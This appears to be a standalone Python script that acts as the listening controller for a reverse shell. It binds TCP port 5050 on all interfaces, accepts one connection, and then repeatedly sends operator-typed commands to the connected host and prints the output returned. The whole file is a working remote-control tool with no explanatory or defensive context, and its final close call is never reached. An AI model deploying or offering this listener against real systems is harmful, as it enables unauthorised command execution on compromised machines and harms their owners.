from socket import *

server = "0.0.0.0"
port = 5050
ADDR = (server,port)

s = socket(AF_INET, SOCK_STREAM)
s.bind((ADDR))
s.listen(5)

print("[+] server is running... ")

c, adr = s.accept()
print("connected to : %s \n" % str(adr))

while True:
     
    shell = input(c.recv(1024).decode('utf-8'))
    c.sendall(shell.encode('utf-8'))
    data = c.recv(102343)
    print(data)

c.close